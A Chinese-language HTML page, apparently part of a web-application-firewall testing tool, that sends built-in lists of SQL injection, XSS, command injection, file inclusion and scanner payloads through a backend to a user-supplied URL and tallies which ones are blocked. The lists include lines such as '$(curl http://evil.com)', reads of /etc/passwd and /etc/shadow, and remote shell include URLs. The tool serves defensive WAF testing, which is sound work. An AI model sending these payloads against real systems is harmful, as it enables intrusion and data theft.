@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>防御测试</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-blue: #1a73e8;
+            --bg-white: #ffffff;
+            --bg-light: #f8f9fa;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --border-light: #dadce0;
+            --shadow-light: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
+            --border-radius: 8px;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-light);
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: var(--bg-white);
+            border-bottom: 1px solid var(--border-light);
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--shadow-light);
+        }
+
+        .header h1 {
+            font-size: 20px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header a {
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 16px;
+            border-radius: var(--border-radius);
+            transition: background-color 0.2s;
+        }
+
+        .header a:hover {
+            background-color: rgba(26, 115, 232, 0.1);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 24px;
+        }
+
+        .url-section {
+            background-color: var(--bg-white);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-light);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        .url-section h2 {
+            font-size: 16px;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+        }
+
+        .url-input-group {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .url-input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid var(--border-light);
+            border-radius: var(--border-radius);
+            font-size: 14px;
+        }
+
+        .url-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+        }
+
+        .card {
+            background-color: var(--bg-white);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-light);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        .card h2 {
+            font-size: 16px;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .btn {
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: var(--border-radius);
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn:hover {
+            background-color: #1557b0;
+        }
+
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 12px;
+        }
+
+        .result-area {
+            margin-top: 16px;
+            padding: 16px;
+            background-color: var(--bg-light);
+            border-radius: var(--border-radius);
+            min-height: 100px;
+            font-family: monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .result-area.success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .result-area.blocked {
+            background-color: #ffebee;
+            color: #c62828;
+        }
+
+        .result-area.error {
+            background-color: #fff3e0;
+            color: #e65100;
+        }
+
+        .payload-list {
+            max-height: 150px;
+            overflow-y: auto;
+            margin-top: 12px;
+        }
+
+        .payload-item {
+            padding: 8px 12px;
+            background-color: var(--bg-light);
+            border-radius: 4px;
+            margin-bottom: 4px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .payload-status {
+            margin-left: 12px;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+
+        .payload-status.pass { color: #2e7d32; }
+        .payload-status.block { color: #c62828; }
+        .payload-status.pending { color: #666; }
+
+        .attack-type {
+            display: inline-block;
+            padding: 2px 8px;
+            background-color: #ffebee;
+            color: #c62828;
+            border-radius: 4px;
+            font-size: 11px;
+            margin-right: 8px;
+        }
+
+        .stats {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 16px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .stat-item.pass .stat-value { color: #2e7d32; }
+        .stat-item.block .stat-value { color: #c62828; }
+        .stat-item.total .stat-value { color: var(--primary-blue); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🛡️ 防御测试</h1>
+        <a href="admin.html">← 返回管理后台</a>
+    </div>
+
+    <div class="container">
+        <div class="url-section">
+            <h2>🌐 目标URL</h2>
+            <div class="url-input-group">
+                <input type="text" id="targetUrl" class="url-input" placeholder="输入目标URL，如: http://example.com/search?q=">
+                <button class="btn" id="runAllBtn" onclick="runAllTests()">🚀 统一测试</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2><span class="attack-type">SQLI</span>SQL注入测试 (规则: 942100, 942140, 942151, 942160, 942170)</h2>
+            <div class="stats">
+                <div class="stat-item total"><span class="stat-value" id="sqli-total">0</span><div class="stat-label">总计</div></div>
+                <div class="stat-item pass"><span class="stat-value" id="sqli-pass">0</span><div class="stat-label">通过</div></div>
+                <div class="stat-item block"><span class="stat-value" id="sqli-block">0</span><div class="stat-label">拦截</div></div>
+            </div>
+            <div class="payload-list" id="sqliPayloads"></div>
+            <div style="margin-top: 16px;">
+                <button class="btn btn-small" onclick="testSQLi()">执行SQL注入测试</button>
+            </div>
+            <div class="result-area" id="sqlResult">等待测试...</div>
+        </div>
+
+        <div class="card">
+            <h2><span class="attack-type">XSS</span>XSS攻击测试 (规则: 941100, 941110, 941120, 941130)</h2>
+            <div class="stats">
+                <div class="stat-item total"><span class="stat-value" id="xss-total">0</span><div class="stat-label">总计</div></div>
+                <div class="stat-item pass"><span class="stat-value" id="xss-pass">0</span><div class="stat-label">通过</div></div>
+                <div class="stat-item block"><span class="stat-value" id="xss-block">0</span><div class="stat-label">拦截</div></div>
+            </div>
+            <div class="payload-list" id="xssPayloads"></div>
+            <div style="margin-top: 16px;">
+                <button class="btn btn-small" onclick="testXss()">执行XSS测试</button>
+            </div>
+            <div class="result-area" id="xssResult">等待测试...</div>
+        </div>
+
+        <div class="card">
+            <h2><span class="attack-type">RCE</span>命令注入测试 (规则: 932230, 932235, 932236)</h2>
+            <div class="stats">
+                <div class="stat-item total"><span class="stat-value" id="rce-total">0</span><div class="stat-label">总计</div></div>
+                <div class="stat-item pass"><span class="stat-value" id="rce-pass">0</span><div class="stat-label">通过</div></div>
+                <div class="stat-item block"><span class="stat-value" id="rce-block">0</span><div class="stat-label">拦截</div></div>
+            </div>
+            <div class="payload-list" id="rcePayloads"></div>
+            <div style="margin-top: 16px;">
+                <button class="btn btn-small" onclick="testRce()">执行命令注入测试</button>
+            </div>
+            <div class="result-area" id="rceResult">等待测试...</div>
+        </div>
+
+        <div class="card">
+            <h2><span class="attack-type">LFI</span>本地文件包含测试 (规则: 930100, 930110, 930120)</h2>
+            <div class="stats">
+                <div class="stat-item total"><span class="stat-value" id="lfi-total">0</span><div class="stat-label">总计</div></div>
+                <div class="stat-item pass"><span class="stat-value" id="lfi-pass">0</span><div class="stat-label">通过</div></div>
+                <div class="stat-item block"><span class="stat-value" id="lfi-block">0</span><div class="stat-label">拦截</div></div>
+            </div>
+            <div class="payload-list" id="lfiPayloads"></div>
+            <div style="margin-top: 16px;">
+                <button class="btn btn-small" onclick="testLfi()">执行LFI测试</button>
+            </div>
+            <div class="result-area" id="lfiResult">等待测试...</div>
+        </div>
+
+        <div class="card">
+            <h2><span class="attack-type">RFI</span>远程文件包含测试 (规则: 931100, 931110, 931120)</h2>
+            <div class="stats">
+                <div class="stat-item total"><span class="stat-value" id="rfi-total">0</span><div class="stat-label">总计</div></div>
+                <div class="stat-item pass"><span class="stat-value" id="rfi-pass">0</span><div class="stat-label">通过</div></div>
+                <div class="stat-item block"><span class="stat-value" id="rfi-block">0</span><div class="stat-label">拦截</div></div>
+            </div>
+            <div class="payload-list" id="rfiPayloads"></div>
+            <div style="margin-top: 16px;">
+                <button class="btn btn-small" onclick="testRfi()">执行RFI测试</button>
+            </div>
+            <div class="result-area" id="rfiResult">等待测试...</div>
+        </div>
+
+        <div class="card">
+            <h2><span class="attack-type">扫描</span>扫描器检测测试 (规则: 913100)</h2>
+            <div class="stats">
+                <div class="stat-item total"><span class="stat-value" id="scan-total">0</span><div class="stat-label">总计</div></div>
+                <div class="stat-item pass"><span class="stat-value" id="scan-pass">0</span><div class="stat-label">通过</div></div>
+                <div class="stat-item block"><span class="stat-value" id="scan-block">0</span><div class="stat-label">拦截</div></div>
+            </div>
+            <div class="payload-list" id="scanPayloads"></div>
+            <div style="margin-top: 16px;">
+                <button class="btn btn-small" onclick="testScanner()">执行扫描器测试</button>
+            </div>
+            <div class="result-area" id="scanResult">等待测试...</div>
+        </div>
+    </div>
+
+    <script>
+        const payloads = {
+            sqli: [
+                "1' OR '1'='1",
+                "1 OR 1=1",
+                "1' UNION SELECT NULL--",
+                "1' UNION SELECT NULL,NULL--",
+                "1' UNION SELECT username,password FROM users--",
+                "admin'--",
+                "1; DROP TABLE users--",
+                "1' AND sleep(5)--",
+                "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
+                "1'; BENCHMARK(5000000,MD5('test'))--",
+                "1' AND 1=1--",
+                "1' AND 1=2--",
+                "' OR 1=1 LIMIT 1--",
+                "1' ORDER BY 1--",
+                "1' ORDER BY 2--",
+                "1' GROUP BY username,password--",
+                "1' HAVING 1=1--",
+                "1' SELECT INTO @var",
+                "1' EXECUTE sp_executesql--",
+                "information_schema.tables",
+                "information_schema.columns",
+                "mysql.user",
+                "CONCAT(0x,0x)",
+                "CHAR(39)",
+                "0x UNION SELECT"
+            ],
+            xss: [
+                "<" + "script>alert(1)</" + "script>",
+                "<" + "script>alert(String.fromCharCode(88,83,83))</" + "script>",
+                "<img src=x onerror=alert(1)>",
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert(1)>",
+                "<svg><" + "script>alert(1)</" + "script></svg>",
+                "<body onload=alert(1)>",
+                "<iframe src=javascript:alert(1)>",
+                "<input onfocus=alert(1) autofocus>",
+                "<select onfocus=alert(1) autofocus>",
+                "<textarea onfocus=alert(1) autofocus>",
+                "<keygen onfocus=alert(1) autofocus>",
+                "<video><source onerror=alert(1)>",
+                "<audio src=x onerror=alert(1)>",
+                "<marquee onstart=alert(1)>",
+                "javascript:alert(1)",
+                "<" + "script>eval(atob('YWxlcnQoMSk='))</" + "script>",
+                "<" + "script>alert(1)</" + "script>",
+                "<svg><a><animate attributeName=href values=javascript:alert(1) /><text y=20>click</text></a></svg>",
+                "<div onpointerover=alert(1)>test</div>"
+            ],
+            rce: [
+                "; ls",
+                "; ls -la",
+                "; cat /etc/passwd",
+                "&& ls",
+                "&& cat /etc/passwd",
+                "| ls",
+                "| cat /etc/passwd",
+                "|| ls",
+                "`whoami`",
+                "$(whoami)",
+                "; whoami",
+                "&& whoami",
+                "| whoami",
+                "; id",
+                "&& id",
+                "| id",
+                "; uname -a",
+                "&& uname -a",
+                "| uname -a",
+                "; ifconfig",
+                "&& ifconfig",
+                "| ifconfig",
+                "; ls /tmp",
+                "&& ls /tmp",
+                "| ls /tmp",
+                "; ping -c 3 127.0.0.1",
+                "&& ping -c 3 127.0.0.1",
+                "; curl http://evil.com",
+                "$(curl http://evil.com)",
+                "; wget http://evil.com",
+                "$(wget http://evil.com)"
+            ],
+            lfi: [
+                "../../../../etc/passwd",
+                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "....//....//....//....//etc/passwd",
+                "/etc/passwd",
+                "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "../../../../etc/shadow",
+                "..\\..\\..\\..\\etc\\shadow",
+                "/proc/self/environ",
+                "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+                "/etc/issue",
+                "/etc/motd",
+                "/proc/version",
+                "/proc/cmdline",
+                "../../../../../proc/self/cmdline",
+                "/var/log/apache2/access.log",
+                "../../../../../../etc/passwd",
+                "/etc/passwd%00",
+                "/etc/passwd.",
+                "..%252f..%252f..%252fetc%252fpasswd"
+            ],
+            rfi: [
+                "http://evil.com/shell.txt",
+                "https://evil.com/shell.txt",
+                "file:///etc/passwd",
+                "ftp://evil.com/shell.txt",
+                "http://127.0.0.1/config.php",
+                "http://evil.com/shell.txt?",
+                "https://evil.com/shell.txt?",
+                "include=http://evil.com/shell.txt",
+                "?page=http://evil.com/shell.txt",
+                "http://10.0.0.1/config.php",
+                "http://169.254.169.254/latest/meta-data/",
+                "\\\\unc\\share\\file"
+            ],
+            scanner: [
+                "sqlmap",
+                "nikto",
+                "nmap",
+                "masscan",
+                "dirb",
+                "gobuster",
+                "burpsuite",
+                "wappalyzer",
+                "zap",
+                "acunetix",
+                "netsparker",
+                "appscan"
+            ]
+        };
+
+        function displayPayloads(category) {
+            const container = document.getElementById(category + 'Payloads');
+            container.innerHTML = payloads[category].map((p, i) =>
+                `<div class="payload-item" id="${category}-${i}">${escapeHtml(p.substring(0, 50))}${p.length > 50 ? '...' : ''}<span class="payload-status pending">⏳</span></div>`
+            ).join('');
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function getTargetUrl() {
+            return document.getElementById('targetUrl').value.trim();
+        }
+
+        function updateStats(category, total, passed, blocked) {
+            document.getElementById(`${category}-total`).textContent = total;
+            document.getElementById(`${category}-pass`).textContent = passed;
+            document.getElementById(`${category}-block`).textContent = blocked;
+        }
+
+        async function testAttack(url, type, payloadList, resultId, category) {
+            const result = document.getElementById(resultId);
+            result.className = 'result-area';
+            result.textContent = `⏳ 正在测试 ${category}...`;
+
+            let passed = 0;
+            let blocked = 0;
+
+            for (let i = 0; i < payloadList.length; i++) {
+                const payload = payloadList[i];
+                const itemId = `${category}-${i}`;
+                const statusEl = document.querySelector(`#${itemId} .payload-status`);
+
+                try {
+                    const response = await fetch('/api/defense-test', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            url: url,
+                            type: type,
+                            payload: payload
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.blocked || data.statusCode === 403) {
+                        blocked++;
+                        if (statusEl) {
+                            statusEl.className = 'payload-status block';
+                            statusEl.textContent = '🔴 ' + data.statusCode;
+                        }
+                    } else {
+                        passed++;
+                        if (statusEl) {
+                            statusEl.className = 'payload-status pass';
+                            statusEl.textContent = '✅ ' + data.statusCode;
+                        }
+                    }
+                } catch (e) {
+                    blocked++;
+                    if (statusEl) {
+                        statusEl.className = 'payload-status block';
+                        statusEl.textContent = '🔴 错误';
+                    }
+                }
+
+                updateStats(category, payloadList.length, passed, blocked);
+            }
+
+            result.className = blocked > 0 ? 'result-area blocked' : 'result-area success';
+            result.textContent = `📊 ${category}测试完成\n总计: ${payloadList.length} | 通过: ${passed} | 拦截: ${blocked}`;
+        }
+
+        async function testSQLi() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+            await testAttack(url, 'SQLI', payloads.sqli, 'sqlResult', 'sqli');
+        }
+
+        async function testXss() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+            await testAttack(url, 'XSS', payloads.xss, 'xssResult', 'xss');
+        }
+
+        async function testRce() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+            await testAttack(url, 'RCE', payloads.rce, 'rceResult', 'rce');
+        }
+
+        async function testLfi() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+            await testAttack(url, 'LFI', payloads.lfi, 'lfiResult', 'lfi');
+        }
+
+        async function testRfi() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+            await testAttack(url, 'RFI', payloads.rfi, 'rfiResult', 'rfi');
+        }
+
+        async function testScanner() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+            await testAttack(url, 'Scanner', payloads.scanner, 'scanResult', 'scan');
+        }
+
+        async function runAllTests() {
+            const url = getTargetUrl();
+            if (!url) {
+                alert('请先输入目标URL');
+                return;
+            }
+
+            const btn = document.getElementById('runAllBtn');
+            btn.disabled = true;
+            btn.textContent = '测试中...';
+
+            await testSQLi();
+            await testXss();
+            await testRce();
+            await testLfi();
+            await testRfi();
+            await testScanner();
+
+            btn.disabled = false;
+            btn.textContent = '🚀 统一测试';
+        }
+
+        for (const category of Object.keys(payloads)) {
+            displayPayloads(category);
+            updateStats(category, payloads[category].length, 0, 0);
+        }
+    </script>
+</body>
+</html>
